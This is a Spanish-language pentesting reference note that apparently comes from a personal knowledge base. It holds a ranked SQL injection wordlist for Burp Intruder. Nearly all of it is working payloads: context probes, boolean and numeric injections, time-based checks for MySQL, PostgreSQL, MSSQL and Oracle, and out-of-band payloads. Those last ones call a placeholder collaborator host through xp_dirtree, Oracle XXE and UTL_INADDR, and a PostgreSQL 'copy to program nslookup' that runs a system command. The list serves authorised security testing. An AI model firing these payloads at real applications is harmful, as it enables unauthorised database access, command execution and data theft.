---
aliases:
  - SQLi wordlist
  - SQLi oracles wordlist
  - wordlist de oráculos SQLi
  - sqli-detection-wordlist
tags:
  - vuln/sql-injection
  - wordlist
  - reference
---

# SQL Injection — Wordlist de detección y oráculos

> Documento **agnóstico al negocio**: payloads para **detectar** la inyección, **romper el contexto** y **confirmar el oráculo** (booleano / error / tiempo / OAST).
> Ordenada **de más a menos probable**. La **extracción** carácter a carácter no se fuzzea: se automatiza → ver [scripts](../README.md#-scripts-de-ayuda).
> Punto de entrada: [../README.md](../README.md) · Sintaxis por motor: [../cheat-sheet.md](../cheat-sheet.md)

## 🧩 Convención de variables genéricas

> Reemplazá el placeholder antes de disparar. En Burp Intruder marcá la posición con `§…§`; en estos archivos van con llaves para que se vean.

<table>
<tr><th>Placeholder</th><th>Reemplazás por</th><th>Ejemplo</th></tr>
<tr><td><code>{OAST}</code></td><td>Tu subdominio de Burp Collaborator</td><td><code>abc123.oastify.com</code></td></tr>
<tr><td><code>{COND}</code></td><td>Condición booleana a testear</td><td><code>1=1</code>, <code>SUBSTRING(password,1,1)>'m'</code></td></tr>
<tr><td><code>{QUERY}</code></td><td>Subconsulta a exfiltrar</td><td><code>SELECT password FROM users LIMIT 1</code></td></tr>
<tr><td><code>{N}</code></td><td>Segundos de retardo</td><td><code>10</code></td></tr>
<tr><td><code>{TABLE}</code> / <code>{COL}</code></td><td>Tabla / columna objetivo</td><td><code>users</code> / <code>password</code></td></tr>
</table>

> [!tip] Comentario de cierre
> Uso `-- -` (doble guion, espacio, guion) como terminador por defecto: funciona en Oracle/MSSQL/PostgreSQL y en MySQL (que exige espacio tras `--`). En MySQL también sirve `#`. Si el input va en URL, el `#` va como `%23` y el espacio como `+`/`%20`.

---

## 🎯 Cómo usar esta wordlist

1. **Tier 0** primero: descubrí el **contexto** (comilla, número, paréntesis) con las sondas diferenciales.
2. Confirmado el contexto, **Tier 1–3** para confirmar la inyección in-band / booleana.
3. Si no hay salida visible, **fingerprint por tiempo (Tier 4)** → ya te dice el motor.
4. Sin tiempo tampoco → **OAST (Tier 5)**, red de seguridad final.
5. Los `.txt` listos para Intruder están en esta carpeta ([`sqli-context-detection.txt`](sqli-context-detection.txt), [`sqli-confirm.txt`](sqli-confirm.txt), [`sqli-oast.txt`](sqli-oast.txt)).

---

## Tier 0 — Sondas de contexto (lo primero, diferencial)

> No confirman inyección por sí solas: comparás **respuesta rota vs. reparada**. Si `'` rompe y `''` repara → contexto string. Si `')` repara → hay paréntesis.

```
'
''
"
""
`
\
')
'))
')))
")
"))
;
'-- -
"-- -
'#
```

## Tier 1 — String simple (el contexto más común)

```
' OR 1=1-- -
' OR '1'='1
'-- -
' OR 1=1#
' OR '1'='1'-- -
admin'-- -
administrator'-- -
' OR 1=1 LIMIT 1-- -
```

Par **diferencial booleano** (mandá los dos y compará; base de toda blind booleana):

```
' AND '1'='1
' AND '1'='2
' AND 1=1-- -
' AND 1=2-- -
```

## Tier 2 — Numérico (sin comillas)

```
OR 1=1
 OR 1=1-- -
1 OR 1=1
1) OR 1=1-- -
1 AND 1=1-- -
1 AND 1=2-- -
```

Prueba aritmética (si `2-1` devuelve lo mismo que `1`, evaluó la resta → numérico):

```
1-1
2-1
```

## Tier 3 — Concatenación string (Oracle / PostgreSQL)

> No rompés con comentario: te insertás **dentro** del string con `||`. En MySQL `||` es OR lógico salvo `PIPES_AS_CONCAT` → usá espacio entre strings o `CONCAT()`.

```
'||(SELECT '')||'
'||(SELECT '') FROM dual||'
'||{QUERY}||'
'+({QUERY})+'
' '{QUERY}' '
```

## Tier 4 — Comilla doble y paréntesis anidados (menos común)

```
" OR 1=1-- -
" OR "1"="1
') OR 1=1-- -
') OR ('1'='1
')) OR 1=1-- -
'))) OR 1=1-- -
') OR ('1'='1'-- -
```

## Tier 5 — Confirmación por tiempo (fingerprint del motor)

> Fijate cuál **tarda ~{N}s**: eso confirma inyección **y** te dice el motor. Ordenadas por frecuencia aproximada en labs/apps reales.

**MySQL**
```
' AND SLEEP({N})-- -
' OR SLEEP({N})-- -
' AND IF({COND},SLEEP({N}),0)-- -
'-- -+ (usar tras confirmar) ' AND SLEEP({N})#
```

**PostgreSQL**
```
'||pg_sleep({N})-- -
' AND {N}=(SELECT {N} FROM pg_sleep({N}))-- -
'; SELECT pg_sleep({N})-- -
' AND (SELECT CASE WHEN ({COND}) THEN pg_sleep({N}) ELSE pg_sleep(0) END)-- -
```

**Microsoft SQL Server**
```
'; WAITFOR DELAY '0:0:{N}'-- -
' WAITFOR DELAY '0:0:{N}'-- -
' IF ({COND}) WAITFOR DELAY '0:0:{N}'-- -
```

**Oracle** (no soporta stacked queries)
```
' AND {N}=DBMS_PIPE.RECEIVE_MESSAGE('a',{N})-- -
' AND (SELECT CASE WHEN ({COND}) THEN 'a'||dbms_pipe.receive_message(('a'),{N}) ELSE NULL END FROM dual) IS NULL-- -
```

## Tier 6 — OAST / out-of-band (último recurso)

> Cuando **no hay** respuesta, error ni tiempo. Marcás `{OAST}` como posición en Intruder y **polleás Collaborator**.

**Microsoft**
```
'; exec master..xp_dirtree '//{OAST}/a'-- -
```

**PostgreSQL**
```
'; copy (SELECT '') to program 'nslookup {OAST}'-- -
```

**Oracle** (XXE, muchas instalaciones sin parchear)
```
' AND EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://{OAST}/">%r;]>'),'/l') IS NULL-- -
' AND (SELECT UTL_INADDR.get_host_address('{OAST}') FROM dual) IS NULL-- -
```

**MySQL** (solo Windows)
```
' AND (SELECT LOAD_FILE('\\\\{OAST}\\a'))-- -
```

Exfiltración por OAST (el dato viaja en el subdominio) → ver plantillas por motor en [../cheat-sheet.md](../cheat-sheet.md#dns-lookup-with-data-exfiltration).

---

## 📦 Wordlists existentes en GitHub (fuentes)

Estas ya existen y las usé como base; la diferencia es que **no vienen ordenadas por probabilidad ni con placeholders** — mezclan contextos y motores:

- **PayloadsAllTheThings** — `SQL Injection/Intruder/` (varios `.txt` por técnica): <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>
- **SecLists** — `Fuzzing/SQLi/` (p. ej. `Generic-SQLi.txt`, `quick-SQLi.txt`): <https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi>
- **fuzzdb** — `attack/sql-injection/detect/`: <https://github.com/fuzzdb-project/fuzzdb>

> Para fuzzing rápido de detección, `Generic-SQLi.txt` de SecLists es lo más directo. Esta wordlist curada es para **entender el contexto y el motor**, no solo lanzar todo a ciegas.
